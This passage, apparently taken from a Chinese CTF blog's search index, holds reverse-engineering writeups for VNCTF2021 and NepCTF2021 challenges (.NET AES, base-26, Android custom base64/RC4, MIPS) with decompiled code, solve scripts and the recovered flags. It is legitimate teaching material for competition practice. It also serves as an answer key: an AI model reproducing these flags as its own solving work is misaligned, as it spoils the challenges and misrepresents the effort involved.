2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF finish 过程中踩到的坑：\n 这道题的行和列很绕，一定要看清楚； 不知道为什么，BitVec 大小不能设置成 $1$； 这题的解有很多，所以最后需要用一个 condition 和 Or 来找到所有的解； 如果对数没有最基本的约束的话，可能会出现一堆 None 的情况。  程序运行结果\n$ FilpGame ./FilpGame.exe Input: 2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999 B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF right, vnctf{MD5(2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D8 1949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF)} 最后算一下md5\n\u0026gt;\u0026gt;\u0026gt; import hashlib \u0026gt;\u0026gt;\u0026gt; hl = hashlib.md5() \u0026gt;\u0026gt;\u0026gt; str = \u0026#39;2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF\u0026#39; \u0026gt;\u0026gt;\u0026gt; hl.update(str.encode(encoding=\u0026#39;utf-8\u0026#39;)) \u0026gt;\u0026gt;\u0026gt; hl.hexdigest() \u0026#39;c51a6d6d3929cd2a0192572e604b371d\u0026#39; 拿到flag！\n总结 又学到了一些z3的用法，真不戳。\n这道题告诉我们，以后算法题无脑上z3就完事了。。。\n鸣谢 感谢 SSGSS 师傅，在我纠结于官方WP的解法时提醒我还有Z3这个神奇的东西！\n","date":"2021-03-25T03:06:10Z","permalink":"/post/vnctf2021-filpgame-and-notsudoku/","title":"VNCTF2021 FilpGame and notsudoku"},{"content":"hardsharp (.NET 逆向) 使用exeinfo发现是 C# .NET文件\n直接用 dnSpy 打开\n找到主函数\nprivate static void Main(string[] args) { AesClass aesClass = new AesClass(); string text = \u0026#34;\u0026#34;; string strB = \u0026#34;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0\u0026#34;; byte[] array = new byte[] { 81, 82, 87, 81, 82, 87, 68, 92, 94, 86, 93, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18 }; Console.WriteLine(\u0026#34;Welcome to nepnep csharp test! plz input the magical code:\u0026#34;); string text2 = Console.ReadLine(); if (text2.Length != 37) { Console.WriteLine(\u0026#34;Nope!\u0026#34;); Console.ReadKey(); return; } if (text2.Substring(0, 4) != \u0026#34;Nep{\u0026#34; || text2[36] != \u0026#39;}\u0026#39;) { Console.WriteLine(\u0026#34;Nope!\u0026#34;); Console.ReadKey(); return; } for (int i = 0; i \u0026lt; 32; i++) { text += Convert.ToChar((int)(array[i] ^ 51)).ToString(); } if (string.Compare(aesClass.AesEncrypt(text2, text), strB) == 0) { Console.WriteLine(\u0026#34;wow, you pass it!\u0026#34;); Console.ReadKey(); return; } Console.WriteLine(\u0026#34;Nope!\u0026#34;); Console.ReadKey(); } 这才是真正的签到题吧\u0026hellip;\n发现是 AES 加密\n进入 AesEncrypt 函数看一眼\npublic string AesEncrypt(string str, string key) { if (string.IsNullOrEmpty(str)) { return null; } byte[] bytes = Encoding.UTF8.GetBytes(str); byte[] array = new RijndaelManaged { Key = Encoding.UTF8.GetBytes(key), Mode = CipherMode.ECB, Padding = PaddingMode.PKCS7 }.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length); return Convert.ToBase64String(array, 0, array.Length); } 发现使用了 ECB 模式，那么直接上网找个 python 脚本计算就行\narray = [81, 82, 87, 81, 82, 87, 68, 92, 94, 86, 93, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18] key = \u0026#39;\u0026#39; for i in array: key += chr(i ^ 51) print (f\u0026#39;key: {key}\u0026#39;) print (f\u0026#39;key length: {len(key)}\u0026#39;) import base64 from Crypto.Cipher import AES message = \u0026#39;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0\u0026#39; encrypt_data = message cipher = AES.new(key) result2 = base64.b64decode(encrypt_data) a = cipher.decrypt(result2) a = a.decode(\u0026#39;utf-8\u0026#39;,\u0026#39;ignore\u0026#39;) a = a.rstrip(\u0026#39;\\n\u0026#39;) a = a.rstrip(\u0026#39;\\t\u0026#39;) a = a.rstrip(\u0026#39;\\r\u0026#39;) a = a.replace(\u0026#39;\\x06\u0026#39;,\u0026#39;\u0026#39;) print(\u0026#39;\\n\u0026#39;,\u0026#39;data:\u0026#39;,a) 得到结果：\nkey: badbadwomen!!!!!!!!!!!!!!!!!!!!!\rkey length: 32\rdata: Nep{up_up_down_down_B_a_b_A_Nep_nep~}\r二十六进制 （c / c++ 逆向） 先用exeinfo打开，发现是无壳32位c++代码。\n用ida打开，找到有用的字符串，定位关键代码\nvoid __noreturn sub_4010A0() { __int64 v0; // rax  char Dst; // [esp+0h] [ebp-108h]  memset(\u0026amp;Dst, 0, 0xFFu); dword_403378 = (int)malloc(8u); Memory = (void *)dword_403378; *(_DWORD *)(dword_403378 + 4) = 0; sub_401020(\u0026#34;plz input right num:\\n\u0026#34;, Dst); sub_401060(\u0026#34;%s\u0026#34;, \u0026amp;Dst, 32); v0 = atoi64(\u0026amp;Dst); sub_401120(v0); } 输入一个数字，将其传入 sub_401120 函数。\n进入这个函数\nvoid __cdecl __noreturn sub_401120(__int64 a1) { signed __int64 v1; // rdi  int v2; // eax  int v3; // edx  char v4; // cl  v1 = __PAIR__(a1, HIDWORD(a1)); if ( a1 ) { do { v2 = sub_401F00(__PAIR__(v1, HIDWORD(v1)), 0x1Au, 0); LODWORD(v1) = v3; v4 = byte_402194[HIDWORD(v1) - 26 * v2]; // 2163qwe)(*\u0026amp;^%489$!057@#\u0026gt;\u0026lt;A  HIDWORD(v1) = v2; sub_401160(v4 ^ 7); } while ( v1 ); } sub_401190(); } 根据题目信息的提示，这是把输入数字转换成为26进制，随后进行一个异或运算，然后存到一个地址里。\n进入 sub_401190 函数\nvoid __noreturn sub_401190() { _DWORD *v0; // esi  int v1; // ecx  _DWORD *v2; // ebx  unsigned int v3; // edi  unsigned int v4; // esi  char *v5; // ecx  char v6; // dl  int v7; // eax  int v8; // edi  void *v9; // eax  int v10; // [esp+10h] [ebp-4h]  v0 = Memory; v1 = 0; v10 = 0; v2 = Memory; v3 = strlen(aFb726); if ( v3 ) { v4 = 0; do { if ( !v2 ) break; v5 = \u0026amp;aFb726[v4]; v6 = *(_BYTE *)v2; v7 = v10 + 1; v2 = (_DWORD *)v2[1]; ++v4; if ( v6 != *v5 ) v7 = v10; v1 = v7; v10 = v7; // 判断某内存种对应位置是否与 aFb726 字符串相同，相同就在长度上加 1  } while ( v4 \u0026lt; v3 ); v0 = Memory; } if ( v0 ) { v8 = v1; do { v9 = (void *)v0[1]; dword_403378 = (int)v0; Memory = v9; free(v0); v0 = Memory; --v8; } while ( Memory ); // 释放内存  } else { v8 = -1; } if ( v10 != strlen(aFb726) ) // 根据之间计算的相同字母数量，判断两个字符串是否相同  { puts(\u0026#34;flag is Error!!!\u0026#34;); exit(v8); } puts(\u0026#34;flag is Right!!!, please md5(\u0026#39;Nep{you_input_num}\u0026#39;) submit th4 flag\u0026#34;); system(\u0026#34;pause\u0026#34;); exit(v8); } 所以只需要将 aFb726 字符串进行反向计算即可\n\u0026gt;\u0026gt;\u0026gt; flag = \u0026#39;Fb72\u0026gt;\u0026amp;6\u0026#39; \u0026gt;\u0026gt;\u0026gt; str = \u0026#39;2163qwe)(*\u0026amp;^%489$!057@#\u0026gt;\u0026lt;A\u0026#39; \u0026gt;\u0026gt;\u0026gt; num = [] \u0026gt;\u0026gt;\u0026gt; for c in flag: ... num.append(str.index(chr(ord(c) ^ 7))) ... \u0026gt;\u0026gt;\u0026gt; num [25, 6, 18, 19, 15, 17, 1] \u0026gt;\u0026gt;\u0026gt; sum = 0 \u0026gt;\u0026gt;\u0026gt; for i in num[::-1]: ... sum *= 26 ... sum += i ... \u0026gt;\u0026gt;\u0026gt; sum 518100101 运行程序进行测试，得到\nplz input right num:\r518100101\rflag is Right!!!, please md5('Nep{you_input_num}') submit th4 flag\r请按任意键继续. . .\r根据题目信息，计算一下数字的32位小写md5（一开始算的是 Nep{51\u0026hellip;01} 这个字符串的md5，发现不对，所以算数字的试了一下）\n得到flag\nNep{967fa25cbea166ded43127f141cff31a}\rpassword （安卓逆向） 这道题做了好久都没做出来，结果发现是把base64的 \u0026lsquo;+/\u0026rsquo; 记反了\u0026hellip;\n 首先用 jeb 打开，找到 com.nepnep.app 中的 MainActivity\npublic class MainActivity extends AppCompatActivity { public Encrypt en; static { System.loadLibrary(\u0026#34;native-lib\u0026#34;); } public MainActivity() { super(); this.en = new Encrypt(); } protected void onCreate(Bundle arg4) { super.onCreate(arg4); this.setContentView(0x7F0B001C); // activity_main  this.findViewById(0x7F080057).setOnClickListener(new View$OnClickListener(this.findViewById(0x7F0800B7), this.findViewById(0x7F0800F2)) { // btn, key, password  public void onClick(View arg4) { if(MainActivity.this.verify(this.val$key.getText().toString()) == 0) { System.out.println(this.val$key.getText().toString()); Toast.makeText(MainActivity.this, \u0026#34;key错误！\u0026#34;, 0).show(); } else if(MainActivity.this.en.file(this.val$passwd.getText().toString().getBytes(), this.val$key.getText().toString())) { Toast.makeText(MainActivity.this, \u0026#34;明文正确，快去解压缩包获取flag吧！\u0026#34;, 0).show(); } else { Toast.makeText(MainActivity.this, \u0026#34;明文错误！\u0026#34;, 0).show(); } } }); } public native int verify(String arg1) { } } 这段代码是读入 key 和 password，然后先判断 key 是否正确，如果正确的话判断 password 是否正确\n那么肯定先破解 key，发现 verify 是外部函数\n找到 native-lib.so 文件，拖入ida，找到函数名里搜索 java 或 verify 之类的，找到这个判断函数\nv4 = (char *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 1352LL))(a1, a3, 0LL); v5 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 1344LL))(a1, v3); memset(\u0026amp;s, 0, 0x3E8uLL); sub_710(v4, (__int64)\u0026amp;s, v5 - 3 * (((unsigned __int64)(\u0026#39;UUUV\u0026#39; * v5) \u0026gt;\u0026gt; 63) + ((unsigned __int64)(\u0026#39;UUUV\u0026#39; * v5) \u0026gt;\u0026gt; 32))); sub_820(\u0026amp;s, (__int64)\u0026amp;v22); // s=\u0026#39;th1s_1s_k3ya!!!!\u0026#39;  if ( v5 \u0026lt;= 0 ) goto LABEL_10; v6 = 0; while ( 1 ) // base64  { v11 = v6; if ( v5 \u0026gt;= 3 ) { *((_BYTE *)\u0026amp;v15 + v6) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6)];// abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ  *((_BYTE *)\u0026amp;v15 + v6 + 1) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 1)]; *((_BYTE *)\u0026amp;v15 + v6 + 2) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 2)]; v7 = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 3)]; v6 += 4; *((_BYTE *)\u0026amp;v15 + v11 + 3) = v7; goto LABEL_4; } if ( v5 == 1 ) break; if ( v5 == 2 ) { *((_BYTE *)\u0026amp;v15 + v6) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6)]; *((_BYTE *)\u0026amp;v15 + v6 + 1) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 1)]; *((_BYTE *)\u0026amp;v15 + v6 + 2) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 2)]; *((_BYTE *)\u0026amp;v15 + v6 + 3) = \u0026#39;=\u0026#39;; goto LABEL_10; } LABEL_4: v10 = __OFADD__(-3, v5); v8 = v5 == 3; v9 = v5 - 3 \u0026lt; 0; v5 -= 3; if ( (unsigned __int8)(v9 ^ v10) | v8 ) goto LABEL_10; } *((_BYTE *)\u0026amp;v15 + v6) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6)]; *((_BYTE *)\u0026amp;v15 + v6 + 1) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 1)]; *(_WORD *)((char *)\u0026amp;v15 + v6 + 2) = \u0026#39;==\u0026#39;; LABEL_10: (*(void (__fastcall **)(__int64, __int64, char *))(*(_QWORD *)a1 + 1360LL))(a1, v3, v4); v12 = _mm_movemask_epi8( _mm_and_si128( _mm_cmpeq_epi8(_mm_load_si128((const __m128i *)\u0026amp;v15), (__m128i)xmmword_BE0), _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)((char *)\u0026amp;v15 + 9)), (__m128i)xmmword_BD0)));// 3g6L2PWL2PXFmR+7ise7iq==  __android_log_print(4LL, \u0026#34;nepnep\u0026#34;, \u0026#34;%s\u0026#34;, \u0026amp;v15); result = 0LL; if ( v12 == 0xFFFF ) { __android_log_print(4LL, \u0026#34;nepnep\u0026#34;, \u0026#34;key is true!\u0026#34;, v13); result = 1LL; } return result; 我们的目的肯定是让 v12 = 0FFFF\n虽然对于 mm 之类的指令不太清楚，但大概的意思应该还是两个字符串相等的，那么就让 (const __m128i *)\u0026amp;v15), (__m128i)xmmword_BE0) 和 ((char *)\u0026amp;v15 + 9)), (__m128i)xmmword_BD0)) 两两相等即可\n在字符串中找到这两个，就能得到 3g6L2PWL2PXFmR+7ise7iq==，这个看起来是一个 base64，但解出来是乱码，所以还是得往前看。上面一大段从 while 开始的代码，显然就是 base64 的最后一步，点开字符串，发现这个不是标准的 base64。那么根据这个字符串反向求解 base64 就可以了。\n实际操作时，继续阅读了 sub_820 和 sub_710 两个函数。只看 sub_820 的话看不太懂，建议先看 sub_710，发现 sub_710 中，将一个字符串的每个字符根据 ascii 数值直接拆开到了八个 char 上，每个 char 存 '0' 或 '1' （ 0x30 和 0x31 ）。到了 sub_820 函数，则每六个进行合并，每一位运算看起来很奇怪，但如果用 0x30 和 0x31 带入会发现就是很简单的将 0 和1 重新组合起来。就是做了一个 base64 运算。\n于是写个代码反向求解就可以了\nimport string from libnum import s2n import base64 en_key = \u0026#39;7+RmFXP2LWP2L6g3\u0026#39;[::-1] + \u0026#39;==qi7esi\u0026#39;[::-1] true_base = string.ascii_uppercase + string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; fake_base = string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; + string.ascii_uppercase key = \u0026#39;\u0026#39; for c in en_key: if c == \u0026#39;=\u0026#39;: key += c continue key += true_base[fake_base.index(c)] key = base64.b64decode(key) print(key) 得到 key: th1s_1s_k3y!!!!!\n 这里我因为打错了base的字符串，卡了整整一天（\n 接下来就可以去求明文密码了\n继续阅读 java 代码\npublic class Encrypt { public Encrypt() { super(); } public void en1(int[] arg6, String arg7, int arg8) { int v0 = 0x100; byte[] v1 = new byte[v0]; byte[] v7 = arg7.getBytes(); int v2 = 0; int v3; for(v3 = 0; v3 \u0026lt; v0; ++v3) { arg6[v3] = 0x100 - v3; // 256-1降序  v1[v3] = v7[v3 % arg8]; // 用密钥填满v1  } int v7_1 = 0; while(v2 \u0026lt; v0) { v7_1 = (arg6[v2] + v7_1 + v1[v2]) % 0x100; arg8 = arg6[v2]; arg6[v2] = arg6[v7_1]; arg6[v7_1] = arg8; ++v2; } } public void en2(int[] arg7, byte[] arg8, int arg9) { int v0 = 0; int v1 = 0; int v2 = 0; while(v0 \u0026lt; arg9) { v1 = (v1 + 1) % 0x100; v2 = ((arg7[v1] \u0026amp; 0xFF) + v2) % 0x100; int v3 = arg7[v1]; arg7[v1] = arg7[v2]; arg7[v2] = v3; arg8[v0] = ((byte)(arg8[v0] ^ arg7[((arg7[v1] \u0026amp; 0xFF) + (arg7[v2] \u0026amp; 0xFF)) % 0x100])); ++v0; } } public boolean file(byte[] arg6, String arg7) { // passwd, key = \u0026#39;th1s_1s_k3ya!!!!\u0026#39;  int[] v0 = new int[0x100]; int v1 = 17; int[] v2 = new int[]{0x8B, 0xD2, 0xD9, 0x5D, 0x95, 0xFF, 0x7E, 0x5F, 0x29, 0x56, 0x12, 0xB9, 0xEF, 0xEC, 0x8B, 0xD0, 0x45}; this.en1(v0, arg7, arg7.length()); this.en2(v0, arg6, arg6.length); if(arg6.length != v1) { return 0; } int v7; for(v7 = 0; v7 \u0026lt; v1; ++v7) { if((arg6[v7] \u0026amp; 0xFF) != v2[v7]) { return 0; } } return 1; } } 懂的话就会发现这个就是一个s盒从 0-255 变成 256-1 的 RC4 密码\n不懂的话直接把代码复制出来，把 file 函数改写成 main 函数，反向求解一下就行（因为仔细观察就可以发现 en2 只对明文做了个异或运算，且异或的对象和明文本身没有关系），这里当密码学的题来做其实就好了。\n这是我复制后改写的 java 代码\npublic class Main { public static void en1(int[] arg6, String arg7, int arg8) { int v0 = 0x100; byte[] v1 = new byte[v0]; byte[] v7 = arg7.getBytes(); int v2 = 0; int v3; for(v3 = 0; v3 \u0026lt; v0; ++v3) { arg6[v3] = 0x100 - v3; // 256-1降序  v1[v3] = v7[v3 % arg8]; // 用密钥填满v1  } int v7_1 = 0; while(v2 \u0026lt; v0) { v7_1 = (arg6[v2] + v7_1 + v1[v2]) % 0x100; arg8 = arg6[v2]; arg6[v2] = arg6[v7_1]; arg6[v7_1] = arg8; ++v2; } } public static void en2(int[] arg7, int[] arg8, int arg9) { int v0 = 0; int v1 = 0; int v2 = 0; while(v0 \u0026lt; arg9) { v1 = (v1 + 1) % 0x100; v2 = ((arg7[v1] \u0026amp; 0xFF) + v2) % 0x100; int v3 = arg7[v1]; arg7[v1] = arg7[v2]; arg7[v2] = v3; arg8[v0] = ((byte)(arg8[v0] ^ arg7[((arg7[v1] \u0026amp; 0xFF) + (arg7[v2] \u0026amp; 0xFF)) % 0x100])); ++v0; } } public static void main(String[] args) { String arg7 = \u0026#34;th1s_1s_k3y!!!!!\u0026#34;; int[] arg6 = new int[]{0x8B, 0xD2, 0xD9, 0x5D, 0x95, 0xFF, 0x7E, 0x5F, 0x29, 0x56, 0x12, 0xB9, 0xEF, 0xEC, 0x8B, 0xD0, 0x45}; int[] v0 = new int[0x100]; int v1 = 17; int[] v2 = new int[]{}; en1(v0, arg7, arg7.length()); en2(v0, arg6, arg6.length); for (int i = 0; i \u0026lt; arg6.length; i++) { System.out.print((char)(arg6[i] \u0026amp; 0xff)); } } } 当然也可以跟在第一段 python 后面继续写\nimport string from libnum import s2n import base64 en_key = \u0026#39;7+RmFXP2LWP2L6g3\u0026#39;[::-1] + \u0026#39;==qi7esi\u0026#39;[::-1] true_base = string.ascii_uppercase + string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; fake_base = string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; + string.ascii_uppercase key = \u0026#39;\u0026#39; for c in en_key: if c == \u0026#39;=\u0026#39;: key += c continue key += true_base[fake_base.index(c)] key = base64.b64decode(key) print(key) # th1s_1s_k3y!!!!! ciphertext = [0x8B, 0xD2, 0xD9, 0x5D, 0x95, 0xFF, 0x7E, 0x5F, 0x29, 0x56, 0x12, 0xB9, 0xEF, 0xEC, 0x8B, 0xD0, 0x45] def en1(key, len_key): res = [] v0 = 0x100 v1 = [0] * v0 v7 = [c for c in key] v2 = 0 for v3 in range(v0): res.append(0x100 - v3) v1[v3] = v7[v3 % len_key] v7_1 = 0 while v2 \u0026lt; v0: v7_1 = (res[v2] + v7_1 + v1[v2]) % 0x100 len_key = res[v2] res[v2] = res[v7_1] res[v7_1] = len_key v2 += 1 return res def en2(res_key, text, len_text): v0 = 0 v1 = 0 v2 = 0 # text = bytes(text) while v0 \u0026lt; len_text: v1 = (v1 + 1) % 0x100 v2 = ((res_key[v1] \u0026amp; 0xFF) + v2) % 0x100 v3 = res_key[v1] res_key[v1] = res_key[v2] res_key[v2] = v3 text[v0] = ((text[v0] ^ res_key[((res_key[v1] \u0026amp; 0xFF) + (res_key[v2] \u0026amp; 0xFF)) % 0x100])) v0 += 1 return text list_key = en1(key[:], len(key)) plaintext = en2(list_key[:], ciphertext[:], len(ciphertext)) print (plaintext) flag = \u0026#39;\u0026#39; for c in plaintext: flag += chr(c) print (flag) 这样就拿到密码了 Y0uG3tTheP4ssw0rd\n然后将 apk 解压一下（用的 bandizip，可以直接解压），在目录下面可以找到 \\assets\\flag.zip\n解压即可拿到 flag\neasy_mips （mips 逆向） 这是一道mips的题，用ida无法反汇编，爬了\n先用ida的字符串搜索找到了关键代码在 tty_write 函数里，并且调用了 encry 函数和 init 函数，但因为没学过mips，也就没法继续分析了\n于是第一次尝试使用 Ghidra\n用 Ghidra 打开二进制文件\n找到关键函数 tty_write\nvoid tty_write(char *param_1,char *param_2) { int __fd; size_t __n; int iVar1; EVP_PKEY_CTX aEStack56 [20]; undefined4 local_24; undefined4 local_20; undefined4 local_1c; undefined4 local_18; undefined4 local_14; char local_10; int local_c; local_c = __stack_chk_guard; local_24 = 0x666c6167; local_20 = 0x7b69745f; local_1c = 0x69735f5f; local_18 = 0x5f5f6661; local_14 = 0x6b657d0a; local_10 = \u0026#39;\\0\u0026#39;; __fd = open(param_1,2); if (__fd \u0026lt; 0) { printf(\u0026#34;cannot open\u0026#34;); /* WARNING: Subroutine does not return */ exit(-1); } __n = strlen(param_2); write(__fd,param_2,__n); read(__fd,aEStack56,0x13); encry(aEStack56); iVar1 = strcmp((char *)aEStack56,(char *)\u0026amp;local_24); if (iVar1 == 0) { write(__fd,\u0026#34;you get the fake flag\\n\u0026#34;,0x16); } else { iVar1 = strcmp((char *)aEStack56,\u0026#34;3_isjA0UeQZcNa\\\\`\\\\Vf\u0026#34;); if (iVar1 != 0) { puts(\u0026#34;you_don\\\u0026#39;t_get_the_flag\u0026#34;); goto LAB_00400b48; } write(__fd,\u0026#34;good_job!\\n\u0026#34;,10); } close(__fd); LAB_00400b48: if (local_c != __stack_chk_guard) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } 之前在 ida 中发现 local_24 是一个fake flag，就不管了\n发现调用了一个 encry 函数，进入这个函数\nvoid encry(EVP_PKEY_CTX *param_1) { char cVar1; int local_10; init(param_1); cVar1 = \u0026#39;\\x05\u0026#39;; local_10 = 0; while (local_10 \u0026lt; 0x13) { param_1[local_10] = (EVP_PKEY_CTX)((char)param_1[local_10] - cVar1); cVar1 = cVar1 + \u0026#39;\\x01\u0026#39;; local_10 = local_10 + 1; } return; } 发现先调用了 init 函数，然后对每一位做了个减法\n查看 init 函数\nint init(EVP_PKEY_CTX *ctx) { int iVar1; char extraout_var; char extraout_var_00; char extraout_var_01; int local_20; iVar1 = __stack_chk_guard; srand(0x1c5e); rand(); rand(); rand(); *ctx = (EVP_PKEY_CTX)((byte)*ctx ^ extraout_var + 0x32U); ctx[5] = (EVP_PKEY_CTX)((byte)ctx[5] ^ extraout_var_00 - 0x39U); ctx[6] = (EVP_PKEY_CTX)((byte)ctx[6] ^ extraout_var_01 + 0x30U); local_20 = 7; while (local_20 \u0026lt; 0xd) { local_20 = local_20 + 1; } if (iVar1 != __stack_chk_guard) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return __stack_chk_guard; } 这里自动分析出现了问题，不知道 extraout_var 和 rand 有什么关系\n于是只能去找对应的汇编慢慢读\n根据 Ghidra 里代码与汇编的映射关系，找到了 extraout_var 的位置\n00400d00 80 43 00 00 lb v1,0x0 (v0)\r00400d04 8f c2 00 24 lw v0,local_1c (s8)\r00400d08 30 42 00 ff andi v0,v0,0xff\r00400d0c 24 42 00 32 addiu v0,v0,0x32\r00400d10 30 42 00 ff andi v0,v0,0xff\r00400d14 7c 02 14 20 seb v0,v0\r00400d18 00 62 10 26 xor v0,v1,v0\r00400d1c 7c 02 1c 20 seb v1,v0\r00400d20 8f c2 00 1c lw v0,local_24 (s8)\r00400d24 a0 43 00 00 sb v1,0x0 (v0)\r找到 addiu 说明 v0 对应的就是 extraout_var，发现是从 local_1c 处取出的\n往上找 local_1c\n00400c80 8f dc 00 10 lw gp,local_30 (s8)\r00400c84 8f 82 80 44 lw v0,-0x7fbc (gp)=\u0026gt;-\u0026gt;rand = 004010e0\r00400c88 00 40 c8 25 or t9,v0,zero\r00400c8c 03 20 f8 09 jalr t9=\u0026gt;rand int rand(void)\r00400c90 00 00 00 00 _nop\r00400c94 8f dc 00 10 lw gp,local_30 (s8)\r00400c98 00 40 18 25 or v1,v0,zero\r00400c9c 83 c2 00 31 lb v0,local_10 +0x1 (s8)\r00400ca0 00 62 10 26 xor v0,v1,v0\r00400ca4 00 02 16 03 sra v0,v0,0x18\r00400ca8 af c2 00 24 sw v0,local_1c (s8)\r从后往前看，最后是将 v0 存到 local_1c 中，倒数第二步是将 v0 右移 0x18 位（这里问了一下会mips的大佬\u0026hellip;），虽然没法完美分析出 rand 的结果存到了哪里，但是可以猜测最后右移了 0x18 位并存到了 local_1c 中。\n于是就可以尝试编写代码，破解flag了。\n首先计算几个 rand 的结果\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; int main(){ srand(0x1c5e); char a[20]; a[0] = \u0026#39;8\u0026#39;; printf(\u0026#34;%x\\n\u0026#34;, rand()); printf(\u0026#34;%x\\n\u0026#34;, rand()); printf(\u0026#34;%x\\n\u0026#34;, rand()); return 0; } 运行得到\n./test_rand 446aef60 5de30bb4 27445d71 随后写个反向的算法\nencry = b\u0026#39;3_isjA0UeQZcNa\\\\`\\\\Vf\u0026#39; flag_1 = [] t = 5 for i in encry: flag_1.append(i + t) t += 1 print (flag_1) rand = [0x44 + 0x32, 0,0,0,0,0x5d - 0x39, 0x27 + 0x30] + [0] * 15 flag = \u0026#39;\u0026#39; for i in range(len(flag_1)): flag += chr(flag_1[i] ^ (rand[i] \u0026amp; 0xff)) print (flag) 得到最终的flag\n[56, 101, 112, 123, 115, 75, 59, 97, 114, 95, 105, 115, 95, 115, 111, 116, 113, 108, 125] Nep{solar_is_sotql} worrrrms （go语言逆向） 只知道用了SM4算法加密，不会go语言，具体的看不懂，爬了。\n总结 这个比赛的前五道题其实就是各个方向的入门题目，有相应的工具并且能够看懂伪代码就可以做了，只需要进行静态分析。做go语言的时候发现go的函数调用太奇怪了，而且有各种指针，不愧是最安全的语言。\n至于后面的几道题，由于解的人太少，也就没有去看，看完wp再补。\n","date":"2021-03-22T18:30:03Z","permalink":"/post/nepctf2021-re-writeups/","title":"NepCTF2021 re writeups"},{"content":"对称之美 题目 Vernam 密码\nimport random import string import itertools from secret import FLAG key = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) cipher = bytes([ord(m)^ord(k) for m, k in zip(FLAG, itertools.cycle(key))]) print(cipher) 思路 由于给了大量的密文，完全可以对密钥空间进行范围上的缩小。\n由于进行的是异或操作，且明文与密钥均为可见字符，只需要对相同位置的密文与所有可能的密钥字符进行异或计算，结果不在可见字符范围内的均可以排除掉。\n经过初步筛选后密钥空间会小很多，进行爆破或者根据上下文手动选择即可。\n代码 import string import itertools key = string.ascii_letters + string.digits # first = [94, 116, 57, 32, 54, 49, 33, 32, 54, 38, 116, 59, 37, 32, 32, 116, 60, 32, 57, 59, 51, 34, 38, 39, 116, 59, 116, 38, 60, 61, 35, 58, 39, 55, 59, 116, 49, 32, 48, 39, 55, 94, 59, 116, 38, 39, 116, 50, 59, 53, 48, 122, 60, 94, 116, 61, 54, 38, 38, 32, 39, 116, 56, 59, 53, 97, 1] # first = [35, 25, 21, 25, 17, 2, 28, 3, 5, 21, 17, 3, 5, 80, 80, 18, 25, 31, 21, 31, 94, 21, 80, 4, 24, 31, 17, 3, 17, 4, 80, 80, 25, 17, 3, 0, 9, 24, 9, 25, 24, 17, 30, 3, 9, 80, 17, 17, 2, 80, 31, 80, 80, 22, 3, 3, 25, 9, 21, 24, 80, 17, 21, 80, 23, 93, 62] # first = [78, 68, 89, 89, 91, 23, 83, 23, 67, 91, 89, 94, 82, 69, 78, 66, 89, 23, 67, 92, 23, 69, 67, 23, 86, 92, 89, 23, 83, 27, 67, 85, 84, 91, 82, 69, 25, 94, 23, 89, 94, 65, 23, 89, 23, 88, 23, 84, 23, 91, 64, 110, 68, 86, 78, 23, 91, 23, 23, 82, 61, 71, 68, 95, 13, 86, 89] # first = [43, 102, 50, 33, 39, 76, 102, 50, 102, 39, 34, 50, 53, 35, 41, 53, 34, 53, 52, 102, 76, 39, 46, 47, 52, 102, 37, 43, 102, 102, 46, 41, 39, 106, 102, 35, 102, 53, 49, 33, 40, 41, 50, 39, 54, 52, 42, 35, 76, 47, 40, 41, 47, 37, 43, 47, 39, 39, 36, 52, 34, 54, 53, 35, 102, 25, 63] # first = [3, 25, 29, 78, 0, 1, 12, 6, 7, 26, 78, 7, 64, 15, 27, 23, 78, 11, 23, 15, 58, 2, 7, 29, 10, 8, 7, 15, 100, 12, 15, 10, 2, 78, 1, 10, 100, 78, 6, 78, 